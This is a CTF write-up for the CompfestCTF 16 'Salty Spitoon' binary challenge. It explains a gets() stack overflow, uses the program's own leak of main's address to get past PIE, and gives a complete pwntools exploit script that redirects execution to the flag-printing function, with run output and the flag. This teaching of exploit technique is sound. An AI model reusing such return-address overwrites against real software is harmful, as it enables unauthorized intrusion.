# Salty Spitoon Writeup by Deffreus - CompfestCTF 16

###### Author: NeoZap

## Description

![pic related](./pic-related.jpg)

Seberapa greget kamu???

`nc challenges.ctf.compfest.id 20008`

[chall](https://ctf.compfest.id/files/c04558fe4c1df1ae7ed3ab322b88b8b5/chall?token=eyJ1c2VyX2lkIjo3MiwidGVhbV9pZCI6MzA3LCJmaWxlX2lkIjo1MX0.ZsKPiA.ADxPFiZI7UAthoibge5xI6IpOjE)

## Files

Another binary...

```
$ file chall 
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=55db9fb520ded5cadf3cc0bae44cba92ddf4e9b5, for GNU/Linux 3.2.0, not stripped
```

## Solution

### Examining the Binary

Let's see how tough this may be:

```
RELRO       STACK CANARY     NX          PIE          RPATH     RUNPATH     Symbols     FORTIFY  Fortified  Fortifiable  FILE
Full RELRO  No canary found  NX enabled  PIE enabled  No RPATH  No RUNPATH  78 Symbols  No       0          2            chall
```

Welp, thank god there's no canary, even though PIE is enabled...

Here's [the decompiled code](https://dogbolt.org/?id=7e51eb43-1284-4150-b142-11253c7c67b2#Ghidra=168), annotated and renamed:

```chall.c
void salty_spitoon(void) {
  puts("Selamat datang di Salty Spitoon, wah ternyata tuan adalah orang paling greget sedunia!😱😱😱");
  puts("Dengan datangnya tamu spesial seperti tuan, kami akan menghidangkan menu spesial kami. Mohon tunggu sebentar, tuan!");
  sleep(3);
  FILE *__stream = fopen("flag.txt","r");
  if ( __stream == (FILE *)0x0 ) {
    puts("Waduh, ternyata menu spesial kami lagi kosong. Mohon maaf, tuan."); // WARNING: Subroutine does not return
    exit(1);
  }
  puts("Terima kasih sudah menunggu. Selamat menikmati menu spesial kami, tuan.");
  while( true ) {
    int result = fgetc(__stream);
    if ( (char)result == -1 )
			break;
    putchar((int)(char)result);
  }
  fclose(__stream);
  puts("\nTerima kasih atas kunjungannya. Mampir lagi ya, tuan!");
  return;
}

int main(void) {
  char buf[60];
  int input;

  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);

  while( true ) {
    while( true ) {
      while( true ) {
        puts("\n=-=-=-=-=-=-=-= [MENU] =-=-=-=-=-=-=-=");
        puts("Kamu berada di depan pintu Salty Spitoon...");
        puts("Kafe paling greget di seluruh Bikini Bottom!");
        puts("Apakah kamu termasuk orang yang greget?");
        puts("1. Ya");
        puts("2. Tidak, tapi saya ingin menjadi greget!!! 💪🔥💪🔥");
        puts("3. Mamah, aku takut. Aku mau ke wingstop ajah 😭😭😭😭");
        printf("> ");
        __isoc99_scanf("%d%*c", &input);
        if ( input != 1 )
					break;
        puts("Selamat datang di Salty Spitoon, seberapa greget kamu?!");
        gets(buf);
        puts("Cuih! Kamu tidak greget sama sekali!");
      }
      if ( input != 2 )
				break;
      puts("Kamu memulai perjalananmu untuk menjadi greget...\n");
      puts("Setelah bertapa selama 1000 tahun...");
      puts("Kamu menemukan sebuah harta karun!");
      printf("Berikut isinya: %p\n",main);
    }
    if ( input == 3 )
			break;
    puts("Tolong, pilih opsi yang benar!");
  }
  puts("Kamu tidak greget, pergilah! hush hush");
  return 0;
}
```

Can you guess where the vulnerability is?<br>
Yup! It's that stinky `gets(buf)`!<br>
You know what kind of vulnerability it is?<br>
It's THE Buffer Overflow!

What are we gonna do?<br>
Well do something cool called Return-Oriented Programming.
Basically, a called function would return to its caller.
We want to overwrite the return address when `main` return.
It's caller is `__libc_start_call_main`, done with instructions like this:

```
   0x00007fdeca0b5d76 <+102>:   mov    rax,QWORD PTR [rip+0x1f023b]        # 0x7fdeca2a5fb8
   0x00007fdeca0b5d7d <+109>:   mov    edi,DWORD PTR [rsp+0x14]
   0x00007fdeca0b5d81 <+113>:   mov    rsi,QWORD PTR [rsp+0x18]
   0x00007fdeca0b5d86 <+118>:   mov    rdx,QWORD PTR [rax]
   0x00007fdeca0b5d89 <+121>:   mov    rax,QWORD PTR [rsp+0x8]
   0x00007fdeca0b5d8e <+126>:   call   rax
   0x00007fdeca0b5d90 <+128>:   mov    edi,eax
```

`call   rax` is the instruction exact part where `main` is called.
The stack will then store the memory address of `mov    edi,eax`, `0x00007fdeca0b5d90`, so that `main` know where to return when it finish!
**But if we were to change that address to somewhere else,
say address of `salty_spitoon`, then `main` would comply and return there!**

### Smashing the PIE

PIE (Position Independent Code) basically just put the program into a random page in memory.
Don't you think it's awful that each time you run the program,
the memory address of `salty_spitoon` change randomly without your consent?<br>
Then how can you know it for sure?

Thankfully, that's what option 2 is there for!
Let's inspect this locally (where PIE memory offset differ from actual instance).
The assembly instructions for `printf("Berikut isinya: %p\n",main)` on option 2 is this:

```
   0x000055662af7745b <+295>:   lea    rsi,[rip+0xfffffffffffffed2]        # 0x55662af77334 <main>
   0x000055662af77462 <+302>:   lea    rdi,[rip+0xf72]        # 0x55662af783db
   0x000055662af77469 <+309>:   mov    eax,0x0
=> 0x000055662af7746e <+314>:   call   0x55662af77120 <printf@plt>
```

```
(gdb) c
Continuing.
Berikut isinya: 0x55662af77334
```

`%p` will load the first argument passed to `printf`, `0x55662af77334`.
Here, the memory address of `salty_spitoon` is `0x000055662af77289`.
The distance for both of that address is the same,
even with PIE enabled.
We can calculate the distance of `0x55662af77334` to `0x000055662af77289`, equal to `-171`.
This means that on the real instance, we can substract `171` from the output of option 2 to get the memory address of `salty_spitoon` for that session!

### Payload

`gets()` will continue to read input until it meet end of file or a newline character.
It could pass the buffer size of `60` (`char buf[60]`),
allowing us to overwrite the memory after it.
That's what's called overflow!

Let's test it out first.
Let see what our input would be with the input `123456789012345678901234567890123456789012345678901234567890ABCD` (64 byte):

```
0x00007ffe3948f850│+0x0000: "12345678901234567890123456789012345678901234567890[...]"    ← $rax, $rsp
0x00007ffe3948f858│+0x0008: "90123456789012345678901234567890123456789012345678[...]"
0x00007ffe3948f860│+0x0010: "78901234567890123456789012345678901234567890ABCD"
0x00007ffe3948f868│+0x0018: "567890123456789012345678901234567890ABCD"
0x00007ffe3948f870│+0x0020: "3456789012345678901234567890ABCD"
0x00007ffe3948f878│+0x0028: "12345678901234567890ABCD"
0x00007ffe3948f880│+0x0030: "901234567890ABCD"
0x00007ffe3948f888│+0x0038: "7890ABCD"
0x00007ffe3948f890│+0x0040: 0x0000000000000000   ← $rbp
0x00007ffe3948f898│+0x0048: 0x00007f1ffd12dd90  →  <__libc_start_call_main+0080> mov edi, eax
```

There's the return address!
We need to extend our input so that we can reach that memory address!
But to prevent unwanted behaviour,
our payload should not change the stack as much as it could be.
Here's how it looks right before `gets` is called:

```
0x00007ffdad3f8d30│+0x0000: 0x0000000000000000   ← $rsp, $rdi
0x00007ffdad3f8d38│+0x0008: 0x0000000000000000
0x00007ffdad3f8d40│+0x0010: 0x0000000000000000
0x00007ffdad3f8d48│+0x0018: 0x0000000000000000
0x00007ffdad3f8d50│+0x0020: 0x0000000000000000
0x00007ffdad3f8d58│+0x0028: 0x0000000000000000
0x00007ffdad3f8d60│+0x0030: 0x0000000000000000
0x00007ffdad3f8d68│+0x0038: 0x0000000100000000
0x00007ffdad3f8d70│+0x0040: 0x0000000000000001   ← $rbp
0x00007ffdad3f8d78│+0x0048: 0x00007f1ffd12dd90  →  <__libc_start_call_main+0080> mov edi, eax
```

Our payload will be something like that,
to put it bluntly.

Remember, CPU works with little endian,
where the most significant bit is on the right,
so the memory address of `0x00007f1ffd12dd90` would become `0x90dd12fd1f7f0000` in our payload.

### Overwriting Memory

We'll be using Python pwntools for this.
Here's our `solve.py`:

```solve.py
from pwn import *

def recvmenu():
    for i in range(8):
        conn.recvline()

conn = remote('challenges.ctf.compfest.id', 20008)

recvmenu()

conn.sendline(b'2')
conn.recvline()
conn.recvline()
conn.recvline()
conn.recvline()
# Get the treasure
harta_karun = conn.recvline()[18:30]
# Calculate `salty_spitoon` address
salty_spitoon = str(hex(int(harta_karun, 16) - 171))[2:]
# Convert to lil endian
target = b''
for i in range(0,len(salty_spitoon),2):
    target += int(salty_spitoon[10-i:12-i], 16).to_bytes(1)
target += b'\x00\x00'
print(target)

recvmenu()

conn.sendline(b'1')
payload = ("\x00"*60+"\x01"+"\x00"*3+"\x01"+"\x00"*7).encode("utf-8") + target
print(payload)
conn.sendline(payload)
conn.recvline()

recvmenu()

conn.sendline(b'3')
# goooooooooooooooooooooooooooooo
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
```

```
$ python3 solve.py
[+] Opening connection to challenges.ctf.compfest.id on port 20008: Done
b'\x89\xb2\x8f\x1e\x00V\x00\x00'
b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x89\xb2\x8f\x1e\x00V\x00\x00'
b'3. Mamah, aku takut. Aku mau ke wingstop ajah \xf0\x9f\x98\xad\xf0\x9f\x98\xad\xf0\x9f\x98\xad\xf0\x9f\x98\xad\n'
b'> Kamu tidak greget, pergilah! hush hush\n'
b'Selamat datang di Salty Spitoon, wah ternyata tuan adalah orang paling greget sedunia!\xf0\x9f\x98\xb1\xf0\x9f\x98\xb1\xf0\x9f\x98\xb1\n'
b'\n'
b'Dengan datangnya tamu spesial seperti tuan, kami akan menghidangkan menu spesial kami. Mohon tunggu sebentar, tuan!\n'
b'Terima kasih sudah menunggu. Selamat menikmati menu spesial kami, tuan.\n'
b'COMPFEST16{emang_boleh_segreget_ini???_maddog_aja_sampe_ketar_ketir_nich_0122111261}\n'
b'\n'
b'Terima kasih atas kunjungannya. Mampir lagi ya, tuan!\n'
[*] Closed connection to challenges.ctf.compfest.id port 20008
```

There's the flag!
We did it!

FLAG: `COMPFEST16{emang_boleh_segreget_ini???_maddog_aja_sampe_ketar_ketir_nich_0122111261}`
